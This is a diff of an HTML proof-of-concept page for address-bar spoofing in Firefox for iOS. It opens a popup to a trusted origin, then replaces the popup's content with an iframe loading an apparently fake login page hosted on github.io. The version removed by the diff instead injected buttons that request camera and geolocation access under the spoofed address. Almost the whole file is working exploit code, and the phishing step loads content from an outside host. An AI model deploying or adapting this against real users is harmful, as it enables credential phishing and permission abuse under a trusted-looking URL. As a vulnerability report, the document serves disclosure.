@@ -1,64 +1,48 @@
+
 <!DOCTYPE html>
 <html>
-<body>
-<button onclick="go()">go</button>
+<head>
+<meta charset="UTF-8">
+<title>Address Bar Spoofing PoC</title>
+<style>
+body { font-family: Arial; text-align:center; margin-top:80px; }
+iframe { width:90%; height:80vh; border:1px solid #ccc; }
+.note { color:red; font-size:13px; margin-bottom:10px; }
+</style>
 
 <script>
 function go() {
-  var x = window.open('https://bugzilla.mozilla.org:90');
+    // Open trusted origin
+   var win = window.open('https://opera.com:90');
 
-  setTimeout(function () {
-    try {
-      x.document.body.innerHTML = `
-        <h1>Browser UI Trust Test</h1>
-        <p>
-          Address bar shows:
-          <b>${x.location.href}</b>
-        </p>
-
-        <p>
-          The content below was injected via DOM manipulation.
-        </p>
-
-        <button onclick="requestLocation()">Request Location</button>
-        <button onclick="requestCamera()">Request Camera</button>
-
-        <pre id="log"></pre>
-
-        <script>
-          function log(msg) {
-            document.getElementById('log').textContent += msg + "\\n";
-          }
-
-          function requestLocation() {
-            if (!navigator.geolocation) {
-              log("Geolocation not supported");
-              return;
-            }
-            navigator.geolocation.getCurrentPosition(
-              () => log("Geolocation permission GRANTED"),
-              (e) => log("Geolocation denied: " + e.message)
-            );
-          }
-
-          function requestCamera() {
-            if (!navigator.mediaDevices) {
-              log("Camera API not supported");
-              return;
-            }
-            navigator.mediaDevices.getUserMedia({ video: true })
-              .then(() => log("Camera permission GRANTED"))
-              .catch(e => log("Camera denied: " + e.name));
-          }
-        <\/script>
-      `;
-    } catch (e) {
-      console.log(e);
+    if (!win) {
+        alert("Popup blocked");
+        return;
     }
-  }, 3000);
+
+    setTimeout(function () {
+        try {
+            // Replace document with attacker content (iframe only)
+            win.document.open();
+            win.document.write(`
+                <p class="note">
+                    Demo: Address bar shows google.com, but content below is attacker-controlled.
+                </p>
+
+                <iframe src="https://cnfdnfial-ops.github.io/spoof/login.html"></iframe>
+            `);
+            win.document.close();
+
+        } catch (e) {
+            console.log("Blocked:", e);
+        }
+    }, 3000);
 }
 </script>
+</head>
+
+<body>
+<h2>Firefox iOS Address Bar Spoofing Test</h2>
+<button onclick="go()">Start Test</button>
 </body>
 </html>
-
-
